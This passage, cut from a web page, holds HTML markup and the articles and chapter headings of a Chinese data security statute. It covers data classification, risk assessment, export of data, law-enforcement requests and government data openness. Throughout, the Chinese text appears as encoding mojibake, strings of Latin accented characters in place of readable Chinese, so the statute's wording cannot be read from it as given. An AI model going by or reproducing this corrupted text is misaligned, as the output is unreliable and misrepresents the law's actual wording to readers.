é»‘ä½“;">ç¬¬å…«æ¡</span>ã€€å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨ï¼Œåº”å½“éµå®ˆæ³•å¾‹ã€æ³•è§„ï¼Œå°Šé‡ç¤¾ä¼šå…¬å¾·å’Œä¼¦ç†ï¼Œéµå®ˆå•†ä¸šé“å¾·å’ŒèŒä¸šé“å¾·ï¼Œè¯šå®å®ˆä¿¡ï¼Œå±¥è¡Œæ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼Œæ‰¿æ‹…ç¤¾ä¼šè´£ä»»ï¼Œä¸å¾—å±å®³å›½å®¶å®‰å…¨ã€å…¬å…±åˆ©ç›Šï¼Œä¸å¾—æŸå®³ä¸ªäººã€ç»„ç»‡çš„åˆæ³•æƒç›Šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¹æ¡</span>ã€€å›½å®¶æ”¯æŒå¼€å±•æ•°æ®å®‰å…¨çŸ¥è¯†å®£ä¼ æ™®åŠï¼Œæé«˜å…¨ç¤¾ä¼šçš„æ•°æ®å®‰å…¨ä¿æŠ¤æ„è¯†å’Œæ°´å¹³ï¼Œæ¨åŠ¨æœ‰å…³éƒ¨é—¨ã€è¡Œä¸šç»„ç»‡ã€ç§‘ç ”æœºæ„ã€ä¼ä¸šã€ä¸ªäººç­‰å…±åŒå‚ä¸æ•°æ®å®‰å…¨ä¿æŠ¤å·¥ä½œï¼Œå½¢æˆå…¨ç¤¾ä¼šå…±åŒç»´æŠ¤æ•°æ®å®‰å…¨å’Œä¿ƒè¿›å‘å±•çš„è‰¯å¥½ç¯å¢ƒã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åæ¡</span>ã€€ç›¸å…³è¡Œä¸šç»„ç»‡æŒ‰ç…§ç« ç¨‹ï¼Œä¾æ³•åˆ¶å®šæ•°æ®å®‰å…¨è¡Œä¸ºè§„èŒƒå’Œå›¢ä½“æ ‡å‡†ï¼ŒåŠ å¼ºè¡Œä¸šè‡ªå¾‹ï¼ŒæŒ‡å¯¼ä¼šå‘˜åŠ å¼ºæ•°æ®å®‰å…¨ä¿æŠ¤ï¼Œæé«˜æ•°æ®å®‰å…¨ä¿æŠ¤æ°´å¹³ï¼Œä¿ƒè¿›è¡Œä¸šå¥åº·å‘å±•ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¸€æ¡</span>ã€€å›½å®¶ç§¯æå¼€å±•æ•°æ®å®‰å…¨æ²»ç†ã€æ•°æ®å¼€å‘åˆ©ç”¨ç­‰é¢†åŸŸçš„å›½é™…äº¤æµä¸åˆä½œï¼Œå‚ä¸æ•°æ®å®‰å…¨ç›¸å…³å›½é™…è§„åˆ™å’Œæ ‡å‡†çš„åˆ¶å®šï¼Œä¿ƒè¿›æ•°æ®è·¨å¢ƒå®‰å…¨ã€è‡ªç”±æµåŠ¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åäºŒæ¡</span>ã€€ä»»ä½•ä¸ªäººã€ç»„ç»‡éƒ½æœ‰æƒå¯¹è¿åæœ¬æ³•è§„å®šçš„è¡Œä¸ºå‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ•è¯‰ã€ä¸¾æŠ¥ã€‚æ”¶åˆ°æŠ•è¯‰ã€ä¸¾æŠ¥çš„éƒ¨é—¨åº”å½“åŠæ—¶ä¾æ³•å¤„ç†ã€‚</p><p style="text-indent: 2em;">æœ‰å…³ä¸»ç®¡éƒ¨é—¨åº”å½“å¯¹æŠ•è¯‰ã€ä¸¾æŠ¥äººçš„ç›¸å…³ä¿¡æ¯äºˆä»¥ä¿å¯†ï¼Œä¿æŠ¤æŠ•è¯‰ã€ä¸¾æŠ¥äººçš„åˆæ³•æƒç›Šã€‚</p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒç« ã€€æ•°æ®å®‰å…¨ä¸å‘å±•</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¸‰æ¡</span>ã€€å›½å®¶ç»Ÿç­¹å‘å±•å’Œå®‰å…¨ï¼ŒåšæŒä»¥æ•°æ®å¼€å‘åˆ©ç”¨å’Œäº§ä¸šå‘å±•ä¿ƒè¿›æ•°æ®å®‰å…¨ï¼Œä»¥æ•°æ®å®‰å…¨ä¿éšœæ•°æ®å¼€å‘åˆ©ç”¨å’Œäº§ä¸šå‘å±•ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åå››æ¡</span>ã€€å›½å®¶å®æ–½å¤§æ•°æ®æˆ˜ç•¥ï¼Œæ¨è¿›æ•°æ®åŸºç¡€è®¾æ–½å»ºè®¾ï¼Œé¼“åŠ±å’Œæ”¯æŒæ•°æ®åœ¨å„è¡Œä¸šã€å„é¢†åŸŸçš„åˆ›æ–°åº”ç”¨ã€‚</p><p style="text-indent: 2em;">çœçº§ä»¥ä¸Šäººæ°‘æ”¿åºœåº”å½“å°†æ•°å­—ç»æµå‘å±•çº³å…¥æœ¬çº§å›½æ°‘ç»æµå’Œç¤¾ä¼šå‘å±•è§„åˆ’ï¼Œå¹¶æ ¹æ®éœ€è¦åˆ¶å®šæ•°å­—ç»æµå‘å±•è§„åˆ’ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åäº”æ¡</span>ã€€å›½å®¶æ”¯æŒå¼€å‘åˆ©ç”¨æ•°æ®æå‡å…¬å…±æœåŠ¡çš„æ™ºèƒ½åŒ–æ°´å¹³ã€‚æä¾›æ™ºèƒ½åŒ–å…¬å…±æœåŠ¡ï¼Œåº”å½“å……åˆ†è€ƒè™‘è€å¹´äººã€æ®‹ç–¾äººçš„éœ€æ±‚ï¼Œé¿å…å¯¹è€å¹´äººã€æ®‹ç–¾äººçš„æ—¥å¸¸ç”Ÿæ´»é€ æˆéšœç¢ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åå…­æ¡</span>ã€€å›½å®¶æ”¯æŒæ•°æ®å¼€å‘åˆ©ç”¨å’Œæ•°æ®å®‰å…¨æŠ€æœ¯ç ”ç©¶ï¼Œé¼“åŠ±æ•°æ®å¼€å‘åˆ©ç”¨å’Œæ•°æ®å®‰å…¨ç­‰é¢†åŸŸçš„æŠ€æœ¯æ¨å¹¿å’Œå•†ä¸šåˆ›æ–°ï¼ŒåŸ¹è‚²ã€å‘å±•æ•°æ®å¼€å‘åˆ©ç”¨å’Œæ•°æ®å®‰å…¨äº§å“ã€äº§ä¸šä½“ç³»ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¸ƒæ¡</span>ã€€å›½å®¶æ¨è¿›æ•°æ®å¼€å‘åˆ©ç”¨æŠ€æœ¯å’Œæ•°æ®å®‰å…¨æ ‡å‡†ä½“ç³»å»ºè®¾ã€‚å›½åŠ¡é™¢æ ‡å‡†åŒ–è¡Œæ”¿ä¸»ç®¡éƒ¨é—¨å’Œå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨æ ¹æ®å„è‡ªçš„èŒè´£ï¼Œç»„ç»‡åˆ¶å®šå¹¶é€‚æ—¶ä¿®è®¢æœ‰å…³æ•°æ®å¼€å‘åˆ©ç”¨æŠ€æœ¯ã€äº§å“å’Œæ•°æ®å®‰å…¨ç›¸å…³æ ‡å‡†ã€‚å›½å®¶æ”¯æŒä¼ä¸šã€ç¤¾ä¼šå›¢ä½“å’Œæ•™è‚²ã€ç§‘ç ”æœºæ„ç­‰å‚ä¸æ ‡å‡†åˆ¶å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åå…«æ¡</span>ã€€å›½å®¶ä¿ƒè¿›æ•°æ®å®‰å…¨æ£€æµ‹è¯„ä¼°ã€è®¤è¯ç­‰æœåŠ¡çš„å‘å±•ï¼Œæ”¯æŒæ•°æ®å®‰å…¨æ£€æµ‹è¯„ä¼°ã€è®¤è¯ç­‰ä¸“ä¸šæœºæ„ä¾æ³•å¼€å±•æœåŠ¡æ´»åŠ¨ã€‚</p><p style="text-indent: 2em;">å›½å®¶æ”¯æŒæœ‰å…³éƒ¨é—¨ã€è¡Œä¸šç»„ç»‡ã€ä¼ä¸šã€æ•™è‚²å’Œç§‘ç ”æœºæ„ã€æœ‰å…³ä¸“ä¸šæœºæ„ç­‰åœ¨æ•°æ®å®‰å…¨é£é™©è¯„ä¼°ã€é˜²èŒƒã€å¤„ç½®ç­‰æ–¹é¢å¼€å±•åä½œã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¹æ¡</span>ã€€å›½å®¶å»ºç«‹å¥å…¨æ•°æ®äº¤æ˜“ç®¡ç†åˆ¶åº¦ï¼Œè§„èŒƒæ•°æ®äº¤æ˜“è¡Œä¸ºï¼ŒåŸ¹è‚²æ•°æ®äº¤æ˜“å¸‚åœºã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåæ¡</span>ã€€å›½å®¶æ”¯æŒæ•™è‚²ã€ç§‘ç ”æœºæ„å’Œä¼ä¸šç­‰å¼€å±•æ•°æ®å¼€å‘åˆ©ç”¨æŠ€æœ¯å’Œæ•°æ®å®‰å…¨ç›¸å…³æ•™è‚²å’ŒåŸ¹è®­ï¼Œé‡‡å–å¤šç§æ–¹å¼åŸ¹å…»æ•°æ®å¼€å‘åˆ©ç”¨æŠ€æœ¯å’Œæ•°æ®å®‰å…¨ä¸“ä¸šäººæ‰ï¼Œä¿ƒè¿›äººæ‰äº¤æµã€‚</p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰ç« ã€€æ•°æ®å®‰å…¨åˆ¶åº¦</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¸€æ¡</span>ã€€å›½å®¶å»ºç«‹æ•°æ®åˆ†ç±»åˆ†çº§ä¿æŠ¤åˆ¶åº¦ï¼Œæ ¹æ®æ•°æ®åœ¨ç»æµç¤¾ä¼šå‘å±•ä¸­çš„é‡è¦ç¨‹åº¦ï¼Œä»¥åŠä¸€æ—¦é­åˆ°ç¯¡æ”¹ã€ç ´åã€æ³„éœ²æˆ–è€…éæ³•è·å–ã€éæ³•åˆ©ç”¨ï¼Œå¯¹å›½å®¶å®‰å…¨ã€å…¬å…±åˆ©ç›Šæˆ–è€…ä¸ªäººã€ç»„ç»‡åˆæ³•æƒç›Šé€ æˆçš„å±å®³ç¨‹åº¦ï¼Œå¯¹æ•°æ®å®è¡Œåˆ†ç±»åˆ†çº§ä¿æŠ¤ã€‚å›½å®¶æ•°æ®å®‰å…¨å·¥ä½œåè°ƒæœºåˆ¶ç»Ÿç­¹åè°ƒæœ‰å…³éƒ¨é—¨åˆ¶å®šé‡è¦æ•°æ®ç›®å½•ï¼ŒåŠ å¼ºå¯¹é‡è¦æ•°æ®çš„ä¿æŠ¤ã€‚</p><p style="text-indent: 2em;">å…³ç³»å›½å®¶å®‰å…¨ã€å›½æ°‘ç»æµå‘½è„‰ã€é‡è¦æ°‘ç”Ÿã€é‡å¤§å…¬å…±åˆ©ç›Šç­‰æ•°æ®å±äºå›½å®¶æ ¸å¿ƒæ•°æ®ï¼Œå®è¡Œæ›´åŠ ä¸¥æ ¼çš„ç®¡ç†åˆ¶åº¦ã€‚</p><p style="text-indent: 2em;">å„åœ°åŒºã€å„éƒ¨é—¨åº”å½“æŒ‰ç…§æ•°æ®åˆ†ç±»åˆ†çº§ä¿æŠ¤åˆ¶åº¦ï¼Œç¡®å®šæœ¬åœ°åŒºã€æœ¬éƒ¨é—¨ä»¥åŠç›¸å…³è¡Œä¸šã€é¢†åŸŸçš„é‡è¦æ•°æ®å…·ä½“ç›®å½•ï¼Œå¯¹åˆ—å…¥ç›®å½•çš„æ•°æ®è¿›è¡Œé‡ç‚¹ä¿æŠ¤ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåäºŒæ¡</span>ã€€å›½å®¶å»ºç«‹é›†ä¸­ç»Ÿä¸€ã€é«˜æ•ˆæƒå¨çš„æ•°æ®å®‰å…¨é£é™©è¯„ä¼°ã€æŠ¥å‘Šã€ä¿¡æ¯å…±äº«ã€ç›‘æµ‹é¢„è­¦æœºåˆ¶ã€‚å›½å®¶æ•°æ®å®‰å…¨å·¥ä½œåè°ƒæœºåˆ¶ç»Ÿç­¹åè°ƒæœ‰å…³éƒ¨é—¨åŠ å¼ºæ•°æ®å®‰å…¨é£é™©ä¿¡æ¯çš„è·å–ã€åˆ†æã€ç ”åˆ¤ã€é¢„è­¦å·¥ä½œã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¸‰æ¡</span>ã€€å›½å®¶å»ºç«‹æ•°æ®å®‰å…¨åº”æ€¥å¤„ç½®æœºåˆ¶ã€‚å‘ç”Ÿæ•°æ®å®‰å…¨äº‹ä»¶ï¼Œæœ‰å…³ä¸»ç®¡éƒ¨é—¨åº”å½“ä¾æ³•å¯åŠ¨åº”æ€¥é¢„æ¡ˆï¼Œé‡‡å–ç›¸åº”çš„åº”æ€¥å¤„ç½®æªæ–½ï¼Œé˜²æ­¢å±å®³æ‰©å¤§ï¼Œæ¶ˆé™¤å®‰å…¨éšæ‚£ï¼Œå¹¶åŠæ—¶å‘ç¤¾ä¼šå‘å¸ƒä¸å…¬ä¼—æœ‰å…³çš„è­¦ç¤ºä¿¡æ¯ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåå››æ¡</span>ã€€å›½å®¶å»ºç«‹æ•°æ®å®‰å…¨å®¡æŸ¥åˆ¶åº¦ï¼Œå¯¹å½±å“æˆ–è€…å¯èƒ½å½±å“å›½å®¶å®‰å…¨çš„æ•°æ®å¤„ç†æ´»åŠ¨è¿›è¡Œå›½å®¶å®‰å…¨å®¡æŸ¥ã€‚</p><p style="text-indent: 2em;">ä¾æ³•ä½œå‡ºçš„å®‰å…¨å®¡æŸ¥å†³å®šä¸ºæœ€ç»ˆå†³å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåäº”æ¡</span>ã€€å›½å®¶å¯¹ä¸ç»´æŠ¤å›½å®¶å®‰å…¨å’Œåˆ©ç›Šã€å±¥è¡Œå›½é™…ä¹‰åŠ¡ç›¸å…³çš„å±äºç®¡åˆ¶ç‰©é¡¹çš„æ•°æ®ä¾æ³•å®æ–½å‡ºå£ç®¡åˆ¶ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåå…­æ¡</span>ã€€ä»»ä½•å›½å®¶æˆ–è€…åœ°åŒºåœ¨ä¸æ•°æ®å’Œæ•°æ®å¼€å‘åˆ©ç”¨æŠ€æœ¯ç­‰æœ‰å…³çš„æŠ•èµ„ã€è´¸æ˜“ç­‰æ–¹é¢å¯¹ä¸­åäººæ°‘å…±å’Œå›½é‡‡å–æ­§è§†æ€§çš„ç¦æ­¢ã€é™åˆ¶æˆ–è€…å…¶ä»–ç±»ä¼¼æªæ–½çš„ï¼Œä¸­åäººæ°‘å…±å’Œå›½å¯ä»¥æ ¹æ®å®é™…æƒ…å†µå¯¹è¯¥å›½å®¶æˆ–è€…åœ°åŒºå¯¹ç­‰é‡‡å–æªæ–½ã€‚</p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬å››ç« ã€€æ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¸ƒæ¡</span>ã€€å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨åº”å½“ä¾ç…§æ³•å¾‹ã€æ³•è§„çš„è§„å®šï¼Œå»ºç«‹å¥å…¨å…¨æµç¨‹æ•°æ®å®‰å…¨ç®¡ç†åˆ¶åº¦ï¼Œç»„ç»‡å¼€å±•æ•°æ®å®‰å…¨æ•™è‚²åŸ¹è®­ï¼Œé‡‡å–ç›¸åº”çš„æŠ€æœ¯æªæ–½å’Œå…¶ä»–å¿…è¦æªæ–½ï¼Œä¿éšœæ•°æ®å®‰å…¨ã€‚åˆ©ç”¨äº’è”ç½‘ç­‰ä¿¡æ¯ç½‘ç»œå¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨ï¼Œåº”å½“åœ¨ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦çš„åŸºç¡€ä¸Šï¼Œå±¥è¡Œä¸Šè¿°æ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ã€‚</p><p style="text-indent: 2em;">é‡è¦æ•°æ®çš„å¤„ç†è€…åº”å½“æ˜ç¡®æ•°æ®å®‰å…¨è´Ÿè´£äººå’Œç®¡ç†æœºæ„ï¼Œè½å®æ•°æ®å®‰å…¨ä¿æŠ¤è´£ä»»ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåå…«æ¡</span>ã€€å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨ä»¥åŠç ”ç©¶å¼€å‘æ•°æ®æ–°æŠ€æœ¯ï¼Œåº”å½“æœ‰åˆ©äºä¿ƒè¿›ç»æµç¤¾ä¼šå‘å±•ï¼Œå¢è¿›äººæ°‘ç¦ç¥‰ï¼Œç¬¦åˆç¤¾ä¼šå…¬å¾·å’Œä¼¦ç†ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒåä¹æ¡</span>ã€€å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨åº”å½“åŠ å¼ºé£é™©ç›‘æµ‹ï¼Œå‘ç°æ•°æ®å®‰å…¨ç¼ºé™·ã€æ¼æ´ç­‰é£é™©æ—¶ï¼Œåº”å½“ç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼›å‘ç”Ÿæ•°æ®å®‰å…¨äº‹ä»¶æ—¶ï¼Œåº”å½“ç«‹å³é‡‡å–å¤„ç½®æªæ–½ï¼ŒæŒ‰ç…§è§„å®šåŠæ—¶å‘ŠçŸ¥ç”¨æˆ·å¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥å‘Šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åæ¡</span>ã€€é‡è¦æ•°æ®çš„å¤„ç†è€…åº”å½“æŒ‰ç…§è§„å®šå¯¹å…¶æ•°æ®å¤„ç†æ´»åŠ¨å®šæœŸå¼€å±•é£é™©è¯„ä¼°ï¼Œå¹¶å‘æœ‰å…³ä¸»ç®¡éƒ¨é—¨æŠ¥é€é£é™©è¯„ä¼°æŠ¥å‘Šã€‚</p><p style="text-indent: 2em;">é£é™©è¯„ä¼°æŠ¥å‘Šåº”å½“åŒ…æ‹¬å¤„ç†çš„é‡è¦æ•°æ®çš„ç§ç±»ã€æ•°é‡ï¼Œå¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨çš„æƒ…å†µï¼Œé¢ä¸´çš„æ•°æ®å®‰å…¨é£é™©åŠå…¶åº”å¯¹æªæ–½ç­‰ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¸€æ¡</span>ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…è¿è¥ä¸­æ”¶é›†å’Œäº§ç”Ÿçš„é‡è¦æ•°æ®çš„å‡ºå¢ƒå®‰å…¨ç®¡ç†ï¼Œé€‚ç”¨ã€Šä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹çš„è§„å®šï¼›å…¶ä»–æ•°æ®å¤„ç†è€…åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…è¿è¥ä¸­æ”¶é›†å’Œäº§ç”Ÿçš„é‡è¦æ•°æ®çš„å‡ºå¢ƒå®‰å…¨ç®¡ç†åŠæ³•ï¼Œç”±å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¼šåŒå›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨åˆ¶å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åäºŒæ¡</span>ã€€ä»»ä½•ç»„ç»‡ã€ä¸ªäººæ”¶é›†æ•°æ®ï¼Œåº”å½“é‡‡å–åˆæ³•ã€æ­£å½“çš„æ–¹å¼ï¼Œä¸å¾—çªƒå–æˆ–è€…ä»¥å…¶ä»–éæ³•æ–¹å¼è·å–æ•°æ®ã€‚</p><p style="text-indent: 2em;">æ³•å¾‹ã€è¡Œæ”¿æ³•è§„å¯¹æ”¶é›†ã€ä½¿ç”¨æ•°æ®çš„ç›®çš„ã€èŒƒå›´æœ‰è§„å®šçš„ï¼Œåº”å½“åœ¨æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„ç›®çš„å’ŒèŒƒå›´å†…æ”¶é›†ã€ä½¿ç”¨æ•°æ®ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¸‰æ¡</span>ã€€ä»äº‹æ•°æ®äº¤æ˜“ä¸­ä»‹æœåŠ¡çš„æœºæ„æä¾›æœåŠ¡ï¼Œåº”å½“è¦æ±‚æ•°æ®æä¾›æ–¹è¯´æ˜æ•°æ®æ¥æºï¼Œå®¡æ ¸äº¤æ˜“åŒæ–¹çš„èº«ä»½ï¼Œå¹¶ç•™å­˜å®¡æ ¸ã€äº¤æ˜“è®°å½•ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åå››æ¡</span>ã€€æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šæä¾›æ•°æ®å¤„ç†ç›¸å…³æœåŠ¡åº”å½“å–å¾—è¡Œæ”¿è®¸å¯çš„ï¼ŒæœåŠ¡æä¾›è€…åº”å½“ä¾æ³•å–å¾—è®¸å¯ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åäº”æ¡</span>ã€€å…¬å®‰æœºå…³ã€å›½å®¶å®‰å…¨æœºå…³å› ä¾æ³•ç»´æŠ¤å›½å®¶å®‰å…¨æˆ–è€…ä¾¦æŸ¥çŠ¯ç½ªçš„éœ€è¦è°ƒå–æ•°æ®ï¼Œåº”å½“æŒ‰ç…§å›½å®¶æœ‰å…³è§„å®šï¼Œç»è¿‡ä¸¥æ ¼çš„æ‰¹å‡†æ‰‹ç»­ï¼Œä¾æ³•è¿›è¡Œï¼Œæœ‰å…³ç»„ç»‡ã€ä¸ªäººåº”å½“äºˆä»¥é…åˆã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åå…­æ¡</span>ã€€ä¸­åäººæ°‘å…±å’Œå›½ä¸»ç®¡æœºå…³æ ¹æ®æœ‰å…³æ³•å¾‹å’Œä¸­åäººæ°‘å…±å’Œå›½ç¼”ç»“æˆ–è€…å‚åŠ çš„å›½é™…æ¡çº¦ã€åå®šï¼Œæˆ–è€…æŒ‰ç…§å¹³ç­‰äº’æƒ åŸåˆ™ï¼Œå¤„ç†å¤–å›½å¸æ³•æˆ–è€…æ‰§æ³•æœºæ„å…³äºæä¾›æ•°æ®çš„è¯·æ±‚ã€‚éç»ä¸­åäººæ°‘å…±å’Œå›½ä¸»ç®¡æœºå…³æ‰¹å‡†ï¼Œå¢ƒå†…çš„ç»„ç»‡ã€ä¸ªäººä¸å¾—å‘å¤–å›½å¸æ³•æˆ–è€…æ‰§æ³•æœºæ„æä¾›å­˜å‚¨äºä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…çš„æ•°æ®ã€‚</p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬äº”ç« ã€€æ”¿åŠ¡æ•°æ®å®‰å…¨ä¸å¼€æ”¾</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¸ƒæ¡</span>ã€€å›½å®¶å¤§åŠ›æ¨è¿›ç”µå­æ”¿åŠ¡å»ºè®¾ï¼Œæé«˜æ”¿åŠ¡æ•°æ®çš„ç§‘å­¦æ€§ã€å‡†ç¡®æ€§ã€æ—¶æ•ˆæ€§ï¼Œæå‡è¿ç”¨æ•°æ®æœåŠ¡ç»æµç¤¾ä¼šå‘å±•çš„èƒ½åŠ›ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åå…«æ¡</span>ã€€å›½å®¶æœºå…³ä¸ºå±¥è¡Œæ³•å®šèŒè´£çš„éœ€è¦æ”¶é›†ã€ä½¿ç”¨æ•°æ®ï¼Œåº”å½“åœ¨å…¶å±¥è¡Œæ³•å®šèŒè´£çš„èŒƒå›´å†…ä¾ç…§æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„æ¡ä»¶å’Œç¨‹åºè¿›è¡Œï¼›å¯¹åœ¨å±¥è¡ŒèŒè´£ä¸­çŸ¥æ‚‰çš„ä¸ªäººéšç§ã€ä¸ªäººä¿¡æ¯ã€å•†ä¸šç§˜å¯†ã€ä¿å¯†å•†åŠ¡ä¿¡æ¯ç­‰æ•°æ®åº”å½“ä¾æ³•äºˆä»¥ä¿å¯†ï¼Œä¸å¾—æ³„éœ²æˆ–è€…éæ³•å‘ä»–äººæä¾›ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰åä¹æ¡</span>ã€€å›½å®¶æœºå…³åº”å½“ä¾ç…§æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œå»ºç«‹å¥å…¨æ•°æ®å®‰å…¨ç®¡ç†åˆ¶åº¦ï¼Œè½å®æ•°æ®å®‰å…¨ä¿æŠ¤è´£ä»»ï¼Œä¿éšœæ”¿åŠ¡æ•°æ®å®‰å…¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åæ¡</span>ã€€å›½å®¶æœºå…³å§”æ‰˜ä»–äººå»ºè®¾ã€ç»´æŠ¤ç”µå­æ”¿åŠ¡ç³»ç»Ÿï¼Œå­˜å‚¨ã€åŠ å·¥æ”¿åŠ¡æ•°æ®ï¼Œåº”å½“ç»è¿‡ä¸¥æ ¼çš„æ‰¹å‡†ç¨‹åºï¼Œå¹¶åº”å½“ç›‘ç£å—æ‰˜æ–¹å±¥è¡Œç›¸åº”çš„æ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ã€‚å—æ‰˜æ–¹åº”å½“ä¾ç…§æ³•å¾‹ã€æ³•è§„çš„è§„å®šå’ŒåˆåŒçº¦å®šå±¥è¡Œæ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼Œä¸å¾—æ“…è‡ªç•™å­˜ã€ä½¿ç”¨ã€æ³„éœ²æˆ–è€…å‘ä»–äººæä¾›æ”¿åŠ¡æ•°æ®ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¸€æ¡</span>ã€€å›½å®¶æœºå…³åº”å½“éµå¾ªå…¬æ­£ã€å…¬å¹³ã€ä¾¿æ°‘çš„åŸåˆ™ï¼ŒæŒ‰ç…§è§„å®šåŠæ—¶ã€å‡†ç¡®åœ°å…¬å¼€æ”¿åŠ¡æ•°æ®ã€‚ä¾æ³•ä¸äºˆå…¬å¼€çš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åäºŒæ¡</span>ã€€å›½å®¶åˆ¶å®šæ”¿åŠ¡æ•°æ®å¼€æ”¾ç›®å½•ï¼Œæ„å»ºç»Ÿä¸€è§„èŒƒã€äº’è”äº’é€šã€å®‰å…¨å¯æ§çš„æ”¿åŠ¡æ•°æ®å¼€æ”¾å¹³å°ï¼Œæ¨åŠ¨æ”¿åŠ¡æ•°æ®å¼€æ”¾åˆ©ç”¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¸‰æ¡</span>ã€€æ³•å¾‹ã€æ³•è§„æˆæƒçš„å…·æœ‰ç®¡ç†å…¬å…±äº‹åŠ¡èŒèƒ½çš„ç»„ç»‡ä¸ºå±¥è¡Œæ³•å®šèŒè´£å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨ï¼Œé€‚ç”¨æœ¬ç« è§„å®šã€‚</p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬å…­ç« ã€€æ³•å¾‹è´£ä»»</span></p><p style="text-indent: 2em;"><span style="font-family: 